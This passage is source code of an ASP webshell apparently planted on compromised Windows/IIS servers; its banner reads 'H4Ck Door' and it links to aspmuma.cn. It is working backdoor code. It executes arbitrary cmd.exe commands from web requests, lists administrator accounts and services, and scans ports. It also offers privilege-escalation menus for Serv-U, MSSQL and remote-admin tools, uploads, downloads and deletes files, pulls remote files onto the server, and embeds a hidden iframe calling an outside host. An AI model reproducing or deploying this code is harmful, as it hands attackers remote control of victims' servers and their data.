RRS"<tr><td height='22'><a href='?Action=Cmd1Shell' target='FileFrame'>&nbsp&nbsp●执行_CMD</a></td></tr>":RRS"<tr><td height='22'><a href='?Action=cmdx' target='FileFrame'>&nbsp&nbsp●执行CMD2<hr color=#424242 size=4></a></td></tr>":RRS"<tr><td height=24 onmouseover=""menu.style.display=''""><b> ↓↓提权相关↓↓</b><div id=menu3 style=""width:100%;display='none'"" onmouseout=""menu3.style.display='none'"">":RRS"<tr><td height='22'><a href='?Action=Course' target='FileFrame'>&nbsp&nbsp●用户账号</a></td></tr>":RRS"<tr><td height='22'><a href='?Action=getTerminalInfo' target='FileFrame'>&nbsp&nbsp●终端登录</a></td></tr>":RRS"<tr><td height='22'><a href='?Action=Alexa' target='FileFrame'>&nbsp&nbsp●组件支持</a></td></tr>":RRS"<tr><td height='22'><a href='?Action=adminab' target='FileFrame'>&nbsp&nbsp●查询管理</a></td></tr>":RRS"<tr><td height='22'><a href='?Action=PageAddToMdb' target='FileFrame'>&nbsp&nbsp●打包解包</b></a></td></tr>":RRS"<tr><td height='22'><a href='?Action=ScanPort' target='FileFrame'>&nbsp&nbsp●端口扫描</a></td></tr>":RRS"<tr><td height='22'><a href='?Action=ReadREG' target='FileFrame'>&nbsp&nbsp●读注册表</a></td></tr>":RRS"<tr><td height='22'><a href='?Action=Servu' target='FileFrame'>&nbsp&nbsp●Serv___U</a></td></tr>":RRS"<tr><td height='22'><a href='?Action=suftp' target='FileFrame'>&nbsp&nbsp●Su-FTP版</a><br>":RRS"<tr><td height='22'><a href='?Action=MMD' target='FileFrame'>&nbsp&nbsp●MS___SQL</a></td></tr>":RRS"<tr><td height='22'><a href='?Action=radmin' target='FileFrame'>&nbsp&nbsp●R__Admin</a></td></tr>":RRS"<tr><td height='22'><a href='?Action=pcanywhere4' target='FileFrame'>&nbsp&nbsp●PcAny_WH</a></td></tr>":RRS"<tr><td height='22'><a href='?Action=TSearch' target='FileFrame'>&nbsp&nbsp●名字搜索</a></td></tr>":RRS"<tr><td height='22'><a href='?Action=php' target='FileFrame'>&nbsp&nbsp●PHP_侦探</a></td></tr>":RRS"<tr><td height='22'><a href='?Action=aspx' target='FileFrame'>&nbsp&nbsp●ASPX侦探</a></td></tr>":RRS"<tr><td height='22'><a href='?Action=jsp' target='FileFrame'>&nbsp&nbsp●JSP_侦探</a></td></tr>":RRS"<tr><td height='22'><a href='?Action=ScanDriveForm' target='FileFrame'>&nbsp&nbsp●查看磁盘</td></tr>":RRS"<tr><td height='22'><a href='?Action=SetFileText' target='FileFrame'>&nbsp&nbsp●超级隐藏</a></td></tr>":RRS"<tr><td height='22'><a href='?Action=upload' target='FileFrame'>&nbsp&nbsp●直接下载</a><br>":RRS"<tr><td height='22'><a href='?Action=DbManager' target='FileFrame'>&nbsp&nbsp●连数据库</a></td></tr>":RRS"<tr><td height='22'><a href='javascript:FullForm("""&RePath(Session("FolderPath")&"\New.mdb")&""",""CreateMdb"")'>&nbsp&nbsp●建数据库</a></td></tr>":RRS"<tr><td height='22'><a href='javascript:FullForm("""&RePath(Session("FolderPath")&"\data.mdb")&""",""CompactMdb"")'>&nbsp&nbsp●压数据库<hr color=#424242 size=1 ></a></td></tr>":RRS"<tr><td height='22'><a href='http://aspmuma.cn/ip/?action=sed&cx_33="&serverip&"' target='FileFrame'>&nbsp&nbsp●同服查询</a></td></tr> ":RRS"<tr><td height='22'><a href='http://aspmuma.cn/mmgx/' target='FileFrame'>&nbsp&nbsp●在线更新</a></td></tr> ":RRS"<tr><td height='22'><a href='?Action=Logout' target='_top'>&nbsp&nbsp●退出登录</a></td></tr>":RRS"<tr><td><hr color=#424242 size=1 width='100%'><blink>"&Copyright&"</blink></td></tr></table>":RRS"</table>":end function
IF SEssIoN("KKK")<>UsERpaSs thEn
IF requeSt.FoRM("Lpass")<>"" TheN
iF REquesT.foRM("Lpass")=uSERPASS then
SEsSIoN("KKK")=uSERPAss
rESPOnsE.rEdirEct Url
end if
ELse
end if
RRs"<center><font face=wingdings color=#dddddd style=font-size:"&font&">"&pic&"</font></center>"
rrs"<!--以下为更新弹窗消息，对SHELL无影响。-->"
rrs"<iframe  width='0' height='0' src=http://aspmuma.cn/mmgx/></iframe> "
rrs"<!--以上为更新弹窗消息，对SHELL无影响。-->"
RRs"<center><a href='"&SItEuRl&"' target='_blank'> <align=center><FONT style=""FONT-SIZE: 45pt; FILTER: shadow(color=red,strength=15); WIDTH: 30%; COLOR:#000000; LINE-HEIGHT: 150%; FONT-FAMILY: 方正舒体"">H4Ck Door</FONT> </center></a><hight=1 width='10%'>":if LShow<>true then
session("IDebugMode")=UU
si="<center><a href='"&SiteURL&"' target='_blank'></a><form action='"&url&"' method='post'><b>PassWord: </b><input name='Lpass' type='password'  size='15'> <input type='Submit' value='Sumbit'></div></center>"
if instr(SI,SIC)<>0 then rrs sI
end if
response.end
end if
function Cmdx()
rrs("<center><form method='post'> "):rrs("<input type=text name='cmdx' size=60 value='cmd.exe'><br> "):rrs("<input type=text name='cmd' size=60><br> "):rrs("<input type=submit value='**执行**'></form> "):rrs("<textarea readonly cols=150 rows=27> "):On Error Resume Next:if request("cmdx")="cmd.exe" then 
rrs oScriptlhn.exec("cmd.exe /c"&request("cmd")).stdout.readall 
end if :rrs oScriptlhn.exec(request("cmdx")&" /c"&request("cmd")).stdout.readall :rrs("</textarea>"):rrs("</center>")
end function
function course()
SI="<br><table width='600' bgcolor=#ffffff border='0' cellspacing='1' cellpadding='0' align='center'>"
SI=SI&"<tr><td height='20' colspan='3' align='center' bgcolor=#99CC99>系统用户与服务</td></tr>"
on error resume next
for each obj in getObject("WinNT://.")
err.clear
if OBJ.StartType="" then
SI=SI&"<tr>"
SI=SI&"<td height=""20"" bgcolor=""#FFFFFF""> "
SI=SI&obj.Name
SI=SI&"</td><td bgcolor=""#FFFFFF""> " 
SI=SI&"系统用户(组)"
SI=SI&"</td></tr>"
SI0="<tr><td height=""20"" bgcolor=""#FFFFFF"" colspan=""2""> </td></tr>" 
end if
if OBJ.StartType=2 then lx="自动"
if OBJ.StartType=3 then lx="手动"
if OBJ.StartType=4 then lx="禁用"
if LCase(mid(obj.path,4,3))<>"win" and OBJ.StartType=2 then
SI1=SI1&"<tr><td height=""20"" bgcolor=""#FFFFFF""> "&obj.Name&"</td><td height=""20"" bgcolor=""#FFFFFF""> "&obj.DisplayName&"<tr><td height=""20"" bgcolor=""#FFFFFF"" colspan=""2"">[启动类型:"&lx&"]<font color=#FF0000> "&obj.path&"</font></td></tr>"
else
SI2=SI2&"<tr><td height=""20"" bgcolor=""#FFFFFF""> "&obj.Name&"</td><td height=""20"" bgcolor=""#FFFFFF""> "&obj.DisplayName&"<tr><td height=""20"" bgcolor=""#FFFFFF"" colspan=""2"">[启动类型:"&lx&"]<font color=#3399FF> "&obj.path&"</font></td></tr>"
end if
next
RRS SI&SI0&SI1&SI2&"</table>"
end function
Function adminab()
Response.Expires=0
on error resume next '查找Administrators组帐号
Set tN=server.createObject("Wscript.Network")
Set objGroup=GetObject("WinNT://"&tN.ComputerName&"/Administrators,group")
For Each admin in objGroup.Members
Response.write admin.Name&"<br>"
Next
if err then
Response.write "他奶奶的不行啊:Wscript.Network"
end if
End Function

function downfile(path)
response.clear
set osm = createobject(obt(6,0))
osm.open
osm.type = 1
osm.loadfromfile path
sz=instrrev(path,"\")+1
response.addheader "content-disposition", "attachment; filename=" & mid(path,sz)
response.addheader "content-length", osm.size
response.charset = "utf-8"
response.contenttype = "application/octet-stream"
response.binarywrite osm.read
response.flush
osm.close
set osm = nothing
end function
function htmlencode(s)
  if not isnull(s) then
    s = replace(s, ">", ">")
    s = replace(s, "<", "<")
    s = replace(s, chr(39), "'")
    s = replace(s, chr(34), """")
    s = replace(s, chr(20), " ")
    htmlencode = s
  end if
end function
function upfile()
  if request("action2")="post" then
    set u=new upc : set f=u.ua("localfile")
uname=u.form("topath")
    if uname="" or f.filesize=0 then
      si="<br>请输入上传的完全路径后选择一个文件上传!"
    else
        f.saveas uname
        if err.number=0 then
          si="<center><br><br><br>文件"&uname&"上传成功！</center>"
end if
end if
set f=nothing:set u=nothing
si=si&backurl
rrs si
showerr()
response.end
  end if
    si="<br><br><br><table border='0' cellpadding='0' cellspacing='0' align='center'>"
    si=si&"<form name='upform' method='post' action='"&url&"?action=upfile&action2=post' enctype='multipart/form-data'>"
    si=si&"<tr><td>"
    si=si&"上传路径：<input name='topath' value='"&rrepath(session("folderpath")&"\cmd.exe")&"' size='40'>"
    si=si&" <input name='localfile' type='file'  size='25'>"
    si=si&" <input type='submit' name='submit' value='上传'>"
    si=si&"</td></tr></form></table>"
  rrs si
end function
:

function cmd1shell()
checked=" checked"
if request("sp")<>"" then session("shellpath") = request("sp")
shellpath=session("shellpath")
if shellpath="" then shellpath = "C:\RECYCLER\cmd.exe"
if request("wscript")<>"yes" then checked=""
if request("cmd")<>"" then defcmd = request("cmd")
si="<form method='post'>"
si=si&"shell路径：<input name='sp' value='"&shellpath&"' style='width:70%'>  "
si=si&"<input class=c type='checkbox' name='wscript' value='yes'"&checked&">wscript.shell"
si=si&"<input name='cmd' style='width:92%' value='"&defcmd&"'> <input type='submit' value='执行'><textarea style='width:100%;height:440;' class='cmd'>"
if request.form("cmd")<>"" then
if request.form("wscript")="yes" then
set cm=createobject(obt(1,0))
set dd=cm.exec(shellpath&" /c "&defcmd)
aaa=dd.stdout.readall
si=si&aaa
else
on error resume next
set ws=server.createobject("wscript.shell")
set ws=server.createobject("wscript.shell")
set fso=server.createobject("scripting.filesystemobject")
sztempfile = server.mappath("cmd.txt")
call ws.run (shellpath&" /c " & defcmd & " > " & sztempfile, 0, true)
set fs = createobject("scripting.filesystemobject")
set ofilelcx = fs.opentextfile (sztempfile, 1, false, 0)
aaa=server.htmlencode(ofilelcx.readall)
ofilelcx.close
call fso.deletefile(sztempfile, true)
si=si&aaa
end if
end if
si=si&chr(13)&"</textarea></form>"
rrs si
end function:Function CreateMdb(Path) 
SI="<br><br>"
Set C = CreateObject(ObT(2,0)) 
C.Create("Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & Path)
Set C = Nothing
If Err.number=0 Then
 SI = SI & Path & "建立成功!"
End If
SI=SI&BackUrl 
RRS SI
End function:Function CompactMdb(Path)
If Not ObT(0,1) Then
Set C=CreateObject(ObT(3,0)) 
  C.CompactDatabase "Provider=Microsoft.Jet.OLEDB.4.0;Data Source="&Path&",Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" &Path
Set C=Nothing
Else
  Set FSO=CreateObject(ObT(0,1))
  If FSO.FileExists(Path) Then
Set C=CreateObject(ObT(3,0)) 
  C.CompactDatabase "Provider=Microsoft.Jet.OLEDB.4.0;Data Source="&Path&",Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" &Path&"_bak"
Set C=Nothing
FSO.DeleteFile Path
FSO.MoveFile Path&"_bak",Path
  Else
SI="<center><br><br><br>数据库"&Path&"没有发现！</center>" 
Err.number=1
  End If
  Set FSO=Nothing
End If
  If Err.number=0 Then
SI="<center><br><br><br>数据库"&Path&"压缩成功！</center>"
  End If
  SI=SI&BackUrl
  RRS SI
End Function:Sub Message(state,msg,flag)
Response.Write "<TABLE width=480 border=0 align=center cellpadding=0 cellspacing=1 bgcolor=#ddd>"
Response.Write "  <TR>"
Response.Write "<TD class=TBHead>系统信息</TD>"
Response.Write "  </TR>"
Response.Write "  <TR>"
Response.Write "<TD align=middle bgcolor=#ecfccd>"
Response.Write "  <TABLE width=82% border=0 cellpadding=5 cellspacing=0>"
Response.Write "<TR>"
Response.Write "  <TD><FONT color=red>"
Response.Write state
Response.Write "</FONT></TD>"
Response.Write "<TR>"
Response.Write "  <TD><P>"
Response.Write msg
Response.Write "</P></TD>"
Response.Write "</TR>"
Response.Write "  </TABLE>"
Response.Write "</TD>"
Response.Write "  </TR>"
Response.Write "  <TR>"
Response.Write "<TD class=TBEnd>"
Response.Write ""
If flag=0 Then
Response.Write "  <INPUT type=button value=关闭 onclick='window.close();'>"
Response.Write ""
Else
Response.Write "  <INPUT type=button value=返回 onClick='history.go(-1);'>"
Response.Write ""
End if
Response.Write "</TD>"
Response.Write "  </TR>"
Response.Write "</TABLE>"
End Sub
Function Red(str)
Red = "<FONT color=#ff2222>" & str & "</FONT>"
End Function:
Function upload()
SI="<br><table width='80%' bgcolor='menu' border='0' cellspacing='1' cellpadding='0' align='center'>" 
RRS "下载到服务器:无回显...为了节省.所以无回显<hr/>"
RRS "<form method=post>"
RRS "<input name=theUrl value='http://' size=80><input type=submit value=' 下载 '><br/>"
RRS "<input name=thePath value=""" & HtmlEncode(Server.MapPath(".")) & """ size=80>"
RRS "<input type=checkbox name=overWrite value=2>存在覆盖"
RRS "<input type=hidden value=downFromUrl name=theAct>"
RRS "</form>"
RRS "<hr/>"
If isDebugMode = False Then
On Error Resume Next
End If
Dim Http, theUrl, thePath, stream, fileName, overWrite
theUrl = Request("theUrl")
thePath = Request("thePath")
overWrite = Request("overWrite")
Set stream = Server.CreateObject("ad"&e&"odb.st"&e&"ream")
Set Http = Server.CreateObject("MSXML2.XMLHTTP")

If overWrite <> 2 Then
overWrite = 1
End If

Http.Open "GET", theUrl, False
Http.Send()
If Http.ReadyState <> 4 Then 

End If

With stream
.Type = 1
.Mode = 3
.Open
.Write Http.ResponseBody
.Position = 0
.SaveToFile thePath, overWrite
If Err.Number = 3004 Then
Err.Clear
fileName = Split(theUrl, "/")(UBound(Split(theUrl, "/")))
If fileName = "" Then
fileName = "index.htm.txt"
End If
thePath = thePath & "\" & fileName
.SaveToFile thePath, overWrite
End If
.Close
End With
chkErr(Err)

Set Http = Nothing
Set Stream = Nothing

If isDebugMode = False Then
On Error Resume Next
End If
End Function:Function TSearch():dim st:st=timer():RW="<br><table width='600' bgcolor='' border='0' cellspacing='1' cellpadding='0' align='center'><form method='post'>"
  RW=RW & "<tr><td height='20' align='center' bgcolor=''>搜索引擎</td></tr>"
  RW=RW & "<tr><td bgcolor=''>&nbsp;路&nbsp;&nbsp;径：<input name='SFpath' value='" & WWWRoot & "' style='width:390'>&nbsp;注:多路绞褂"",""号连接.</td></tr>"
  RW=RW & "<tr><td bgcolor=''>&nbsp;文件名：<input name='Sfk' style='width:200'>&nbsp;<input type='submit' value='搜索' class='submit'>&nbsp;[部分也行]</td></tr>"  
  RW=RW & "</form></table>"
  Response.Write RW : RW=""
  if Request.Form("Sfk")<>"" then
  Set newsearch=new SearchFile
  newsearch.Folders=trim(Request.Form("SFpath"))
  newsearch.keyword=trim(Request.Form("Sfk"))
  newsearch.Search
  Set newsearch=Nothing
  Response.Write "Mr："&(timer()-st)*1000&"毫秒<hr>"
  end if
End Function 
Class SearchFile
 dim Folders,keyword,objFso,Counter
 Private Sub Class_Initialize
  Set objFso=Server.CreateObject(ObT(0,0))
  Counter=0
 End Sub
 Private Sub Class_Terminate
    Set objFso=Nothing
 End Sub
 Function Search
  Folders=split(Folders,",")
  flag=instr(keyword,"\") or instr(keyword,"/")
  flag=flag or instr(keyword,":")
  flag=flag or instr(keyword,"|")
  flag=flag or instr(keyword,"&")
  if flag then
    Response.Write "<table align='center' width='600'><hr><p align='center'><font color='red'>PI字不能包含/\:|&</font><br>"
 Exit Function
  else
    Response.Write "<table align='center' width='600'><hr>"
  end if
  dim i
  for i=0 to ubound(Folders)
    Call GetAllFile(Folders(i))
  next
  Response.Write "<p align='center'>共搜索到<font color='red'>"&Counter&"</font>Y果<br>"
 End Function
 Private Function GetAllFile(Folder)
  dim objFd,objFs,objFf
  Set objFd=objFso.GetFolder(Folder)
  Set objFs=objFd.SubFolders
  Set objFf=objFd.Files
  dim strFdName
  On Error Resume Next
  For Each OneDir In objFs
    strFdName=OneDir.Name
    If strFdName<>"Config.Msi" EQV strFdName<>"RECYCLED" EQV strFdName<>"RECYCLER" EQV strFdName<>"System Volume Information" Then 
      SFN=Folder&"\"&strFdName
      Call GetAllFile(SFN)
 End If
  Next
  dim strFlName
  For Each OneFile In objFf
    strFlName=OneFile.Name
    If strFlName<>"desktop.ini" EQV strFlName<>"folder.htt" Then
      FN=Folder&"\"&strFlName
   Counter=Counter+ColorOn(FN)
 End If
  Next
  Set objFd=Nothing
  Set objFs=Nothing
  Set objFf=Nothing
 End Function
 Private Function CreatePattern(keyword)   
   CreatePattern=keyword
   CreatePattern=Replace(CreatePattern,".","\.")
   CreatePattern=Replace(CreatePattern,"+","\+")
   CreatePattern=Replace(CreatePattern,"(","\(")
   CreatePattern=Replace(CreatePattern,")","\)")
   CreatePattern=Replace(CreatePattern,"[","\[")
   CreatePattern=Replace(CreatePattern,"]","\]")
   CreatePattern=Replace(CreatePattern,"{","\{")
   CreatePattern=Replace(CreatePattern,"}","\}")
   CreatePattern=Replace(CreatePattern,"*","[^\\\/]*")
   CreatePattern=Replace(CreatePattern,"?","[^\\\/]{1}")
   CreatePattern="("&CreatePattern&")+"
 End Function
 Private Function ColorOn(FileName)
   dim objReg
   Set objReg=new RegExp
   objReg.Pattern=CreatePattern(keyword)
   objReg.IgnoreCase=True
   objReg.Global=True
   retVal=objReg.Test(Mid(FileName,InstrRev(FileName,"\")+1))
   if retVal then
     OutPut=objReg.Replace(Mid(FileName,InstrRev(FileName,"\")+1),"<font color=''>$1</font>")
     OutPut="<table align='center' width='600'>&nbsp;" & Mid(FileName,1,InstrRev(FileName,"\")) & OutPut
  Response.Write OutPut
  Response.flush
  ColorOn=1
   else
     ColorOn=0
   end if
   Set objReg=Nothing
 End Function
End Class
function php():set fso=Server.CreateObject("Scripting.FileSystemObject"):fso.CreateTextFile(server.mappath("test.php")).Write"<?PHP echo '恭喜,服掌髦СPHP'?><?php phpinfo()?>":Response.write"<iframe src=test.php width=950 height=300></iframe> ":Response.write "<br><br><p><br><p><br><br><p><br><center>如果你能看到test.php正常@示,表示支持PHP<p><font color=red否t就是不支持拉!，y完後得删除！":End function
function jsp():set fso=Server.CreateObject("Scripting.FileSystemObject"):fso.CreateTextFile(server.mappath("test.jsp")).Write"oo∩_∩oo":Response.write"<iframe src=test.jsp width=950 height=300></iframe> ":Response.write "<br><br><p><br><p><br><br><p><br><center>如果你能看到test.jsp正常@示,表示支持jsp<p></font><p><a href='?Action=apjdel'><font size=5 color=red>删除测试的所有文件(必须全部测试才可以删除,否则会出错!)</font></a></center>":End function:function aspx():set fso=Server.CreateObject("Scripting.FileSystemObject"):fso.CreateTextFile(server.mappath("test.aspx")).Write"oo∩_∩oo":Response.write"<iframe src=test.aspx width=950 height=300></iframe> ":Response.write "<br><br><p><br><p><br><br><p><br><center>如果你能看到Test.aspx正常显示,表示支持asp.net<p><font color=red>否t就是不支持拉!，y完後得删除！":End function
function apjdel():set fso=Server.CreateObject("Scripting.FileSystemObject"):fso.DeleteFile(server.mappath("test.aspx")):fso.DeleteFile(server.mappath("test.php")):fso.DeleteFile(server.mappath("test.jsp")):response.write"删除完毕!":End function
Function DbManager()
  SqlStr=Trim(Request.Form("SqlStr"))
  DbStr=Request.Form("DbStr")
  SI=SI&"<table width='650'  border='0' cellspacing='0' cellpadding='0'>"
  SI=SI&"<form name='DbForm' method='post' action=''>"
  SI=SI&"<tr><td width='100' height='27'>  数据库连接串:</td>"
  SI=SI&"<td><input name='DbStr' style='width:470' value="""&DbStr&"""></td>"
  SI=SI&"<td width='60' align='center'><select name='StrBtn' onchange='return FullDbStr(options[selectedIndex].value)'><option value=-1>连接串示例</option><option value=0>Access连接</option>"
  SI=SI&"<option value=1>MsSql连接</option><option value=2>MySql连接</option><option value=3>DSN连接</option>"
  SI=SI&"<option value=-1>--SQL语法--</option><option value=4>显示数据</option><option value=5>添加数据</option>"
  SI=SI&"<option value=6>删除数据</option><option value=7>修改数据</option><option value=8>建数据表</option>"
  SI=SI&"<option value=9>删数据表</option><option value=10>添加字段</option><option value=11>删除字段</option>"
  SI=SI&"<option value=12>完全显示</option></select></td></tr>"
  SI=SI&"<input name='Action' type='hidden' value='DbManager'><input name='Page' type='hidden' value='1'>"
  SI=SI&"<tr><td height='30'> SQL操作命令:</td>"
  SI=SI&"<td><input name='SqlStr' style='width:470' value="""&SqlStr&"""></td>"
  SI=SI&"<td align='center'><input type='submit' name='Submit' value='执行' onclick='return DbCheck()'></td>"
  SI=SI&"</tr></form></table><span id='abc'></span>"
  RRS SI:SI=""
  If Len(DbStr)>40 Then
  Set Conn=CreateObject(ObT(5,0))
  Conn.Open DbStr
  Set Rs=Conn.OpenSchema(20) 
  SI=SI&"<table><tr height='25' Bgcolor='#CCCCCC'><td>表<br>名</td>"
  Rs.MoveFirst 
  Do While Not Rs.Eof
If Rs("TABLE_TYPE")="TABLE" then
  TName=Rs("TABLE_NAME")
  SI=SI&"<td align=center><a href=""javascript:if(confirm('确定删除么？'))FullSqlStr('DROP TABLE ["&TName&"]',1)"">[ del ]</a><br>"
  SI=SI&"<a href='javascript:FullSqlStr(""SELECT * FROM ["&TName&"]"",1)'>"&TName&"</a></td>"
End If 
Rs.MoveNext 
  Loop 
  Set Rs=Nothing
  SI=SI&"</tr></table>"
  RRS SI:SI=""
If Len(SqlStr)>10 Then
  If LCase(Left(SqlStr,6))="select" then
SI=SI&"执行语句："&SqlStr
Set Rs=CreateObject("Adodb.Recordset")
Rs.open SqlStr,Conn,1,1
FN=Rs.Fields.Count
RC=Rs.RecordCount
Rs.PageSize=20
Count=Rs.PageSize
PN=Rs.PageCount
Page=request("Page")
If Page<>"" Then Page=Clng(Page)
If Page="" Or Page=0 Then Page=1
If Page>PN Then Page=PN
If Page>1 Then Rs.absolutepage=Page
SI=SI&"<table><tr height=25 bgcolor=#cccccc><td></td>"  
For n=0 to FN-1
  Set Fld=Rs.Fields.Item(n)
  SI=SI&"<td align='center'>"&Fld.Name&"</td>"
  Set Fld=nothing
Next
SI=SI&"</tr>"
Do While Not(Rs.Eof or Rs.Bof) And Count>0
  Count=Count-1
  Bgcolor="#EFEFEF"
  SI=SI&"<tr><td bgcolor=#cccccc><font face='wingdings'>x</font></td>"  
  For i=0 To FN-1
If Bgcolor="#EFEFEF" Then:Bgcolor="#F5F5F5":Else:Bgcolor="#EFEFEF":End if
If RC=1 Then
ColInfo=HTMLEncode(Rs(i))
Else
ColInfo=HTMLEncode(Left(Rs(i),50))
End If
SI=SI&"<td bgcolor="&Bgcolor&">"&ColInfo&"</td>"
  Next
  SI=SI&"</tr>"
  Rs.MoveNext
Loop
RRS SI:SI=""
SqlStr=HtmlEnCode(SqlStr)
SI=SI&"<tr><td colspan="&FN+1&" align=center>记录数："&RC&" 页码："&Page&"/"&PN
If PN>1 Then
  SI=SI&"  <a href='javascript:FullSqlStr("""&SqlStr&""",1)'>首页</a> <a href='javascript:FullSqlStr("""&SqlStr&""","&Page-1&")'>上一页</a> "
  If Page>8 Then:Sp=Page-8:Else:Sp=1:End if
  For i=Sp To Sp+8
If i>PN Then Exit For
If i=Page Then
SI=SI&i&" "
Else
SI=SI&"<a href='javascript:FullSqlStr("""&SqlStr&""","&i&")'>"&i&"</a> "
End If
  Next
  SI=SI&" <a href='javascript:FullSqlStr("""&SqlStr&""","&Page+1&")'>下一页</a> <a href='javascript:FullSqlStr("""&SqlStr&""","&PN&")'>尾页</a>"
End If
SI=SI&"<hr color='#EFEFEF'></td></tr></table>"
Rs.Close:Set Rs=Nothing
RRS SI:SI=""
  Else
Conn.Execute(SqlStr)
SI=SI&"SQL语句："&SqlStr
  End If
  RRS SI:SI=""
End If
  Conn.Close
  Set Conn=Nothing
  End If
End Function
Dim T1
Class UPC
  Dim D1,D2
  Public Function Form(F)
F=lcase(F)
If D1.exists(F) then:Form=D1(F):else:Form="":end if
  End Function
  Public Function UA(F)
F=lcase(F)
If D2.exists(F) then:set UA=D2(F):else:set UA=new FIF:end if
  End Function
  Private Sub Class_Initialize
  Dim TDa,TSt,vbCrlf,TIn,DIEnd,T2,TLen,TFL,SFV,FStart,FEnd,DStart,DEnd,UpName
set D1=CreateObject(ObT(4,0))
if Request.TotalBytes<1 then Exit Sub
set T1 = CreateObject(ObT(6,0))
T1.Type = 1 : T1.Mode =3 : T1.Open
T1.Write  Request.BinaryRead(Request.TotalBytes)
T1.Position=0 : TDa =T1.Read : DStart = 1
DEnd = LenB(TDa)
set D2=CreateObject(ObT(4,0))
vbCrlf = chrB(13) & chrB(10)
set T2 = CreateObject(ObT(6,0))
TSt = MidB(TDa,1, InStrB(DStart,TDa,vbCrlf)-1)
TLen = LenB (TSt)
DStart=DStart+TLen+1
while (DStart + 10) < DEnd
  DIEnd = InStrB(DStart,TDa,vbCrlf & vbCrlf)+3
  T2.Type = 1 : T2.Mode =3 : T2.Open
  T1.Position = DStart
  T1.CopyTo T2,DIEnd-DStart
  T2.Position = 0 : T2.Type = 2 : T2.Charset ="gb2312"
  TIn = T2.ReadText : T2.Close
  DStart = InStrB(DIEnd,TDa,TSt)
  FStart = InStr(22,TIn,"name=""",1)+6
  FEnd = InStr(FStart,TIn,"""",1)
  UpName = lcase(Mid (TIn,FStart,FEnd-FStart))
  if InStr (45,TIn,"filename=""",1) > 0 then
set TFL=new FIF
FStart = InStr(FEnd,TIn,"filename=""",1)+10
FEnd = InStr(FStart,TIn,"""",1)
FStart = InStr(FEnd,TIn,"Content-Type: ",1)+14
FEnd = InStr(FStart,TIn,vbCr)
TFL.FileStart =DIEnd
TFL.FileSize = DStart -DIEnd -3
if not D2.Exists(UpName) then
  D2.add UpName,TFL
end if
  else
T2.Type =1 : T2.Mode =3 : T2.Open
T1.Position = DIEnd : T1.CopyTo T2,DStart-DIEnd-3
T2.Position = 0 : T2.Type = 2
T2.Charset ="gb2312"
SFV = T2.ReadText
T2.Close
if D1.Exists(UpName) then
  D1(UpName)=D1(UpName)&", "&SFV
else
  D1.Add UpName,SFV
end if
  end if
  DStart=DStart+TLen+1
wend
TDa=""
set T2 =nothing
  End Sub
  Private Sub Class_Terminate
if Request.TotalBytes>0 then
  D1.RemoveAll:D2.RemoveAll
  set D1=nothing:set D2=nothing
  T1.Close:set T1 =nothing
end if
  End Sub
End Class
Class FIF
dim FileSize,FileStart
  Private Sub Class_Initialize
  FileSize = 0
  FileStart= 0
  End Sub
  Public function SaveAs(F)
  dim T3
  SaveAs=true
  if trim(F)="" or FileStart=0 then exit function
  set T3=CreateObject(ObT(6,0))
 T3.Mode=3 : T3.Type=1 : T3.Open
 T1.position=FileStart
 T1.copyto T3,FileSize
 T3.SaveToFile F,2
 T3.Close
 set T3=nothing
 SaveAs=false
end function
End Class
Class LBF
  Dim CF
  Private Sub Class_Initialize
SET CF=CreateObject(ObT(0,0))
  End Sub
  Private Sub Class_Terminate
Set CF=Nothing
  End Sub
Function ShowDriver()
For Each D in CF.Drives
  RRS"   <a href='javascript:ShowFolder("""&D.DriveLetter&":\\"")'>&nbsp;&nbsp;&nbsp;磁盘 ("&D.DriveLetter&":)</a><br>" 
Next
  End Function
  Function Show1File(Path)
Set FOLD=CF.GetFolder(Path)
i=0
SI="<table width='100%' border='0' cellspacing='0' cellpadding='6'><tr>"
For Each F in FOLD.subfolders
SI=SI&"<td height=10 width=17% align=center><div style='border:1px solid "&BorderColor&"'>"
SI=SI&"<a href='javascript:ShowFolder("""&RePath(Path&"\"&F.Name)&""")' title=""进入""><font face='wingdings' size='6'>0</font><br>"&F.Name&"</a>" 
SI=SI&"<br>[<a href='javascript:FullForm("""&RePath(Path&"\"&F.Name)&""",""CopyFolder"")'onclick='return yesok()' class='am' title='复制'>Copy</a> "
SI=SI&"<a href='javascript:FullForm("""&Replace(Path&"\"&F.Name,"\","\\")&""",""DelFolder"")'onclick='return yesok()' class='am' title='删除'>Del</a>"
SI=SI&" <a href='javascript:FullForm("""&RePath(Path&"\"&F.Name)&""",""MoveFolder"")'onclick='return yesok()' class='am' title='移动'>Move</a>"
SI=SI&" <a href='javascript:FullForm("""&RePath(Path&"\"&F.Name)&""",""DownFile"")'onclick='return yesok()' class='am' title='下载'>Down</a>]</div></td>"
i=i+1
If i mod 5 = 0 then SI=SI&"</tr><tr>"
Next
SI=SI&"</tr><tr><td height=2></td></tr></table>"
RRS SI:SI="":i=0
SI="<table width='100%' border='0' cellspacing='0' cellpadding='6'><tr>"
For Each L in Fold.files
SI=SI&"<td height='30'><div style='border:1px solid "&BorderColor&"'><a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""DownFile"");' title='下载'><font face='wingdings' size='5'>2</font>"&L.Name&"</a> [ "
SI=SI&"<a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""EditFile"")' class='am' title='编辑'>Edit</a> "
SI=SI&"<a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""DelFile"")'onclick='return yesok()' class='am' title='删除'>Del</a> "
SI=SI&"<a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""CopyFile"")' class='am' title='复制'>Copy</a> "
SI=SI&"<a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""MoveFile"")' class='am' title='移动'>Move</a> ] - "
SI=SI&clng(L.size/1024)&"K<br><b>"
SI=SI&L.Type&"</b> <i> - "
SI=SI&L.DateLastModified&"</i></div></td>"
i=i+1
If i mod 2 = 0 then SI=SI&"</tr><tr>"
Next
 RRS SI&"</tr></table>"
Set FOLD=Nothing
  End Function
  Function DelFile(Path)
If CF.FileExists(Path) Then
CF.DeleteFile Path
SI="<center><br><br><br>文件 "&Path&" 删除成功！</center>"
SI=SI&BackUrl
RRS SI
End If
  End Function
Function EditFile(Path)
  If Request("Action2")="Post" Then
  Set T=CF.CreateTextFile("\\?\"&Path)
T.WriteLine Request.form("content")
T.close
  Set T=nothing

SI="<center><br><br><br>文件保存成功！</center>"
SI=SI&BackUrl
RRS SI
Response.End
  End If
  If Path<>"" Then
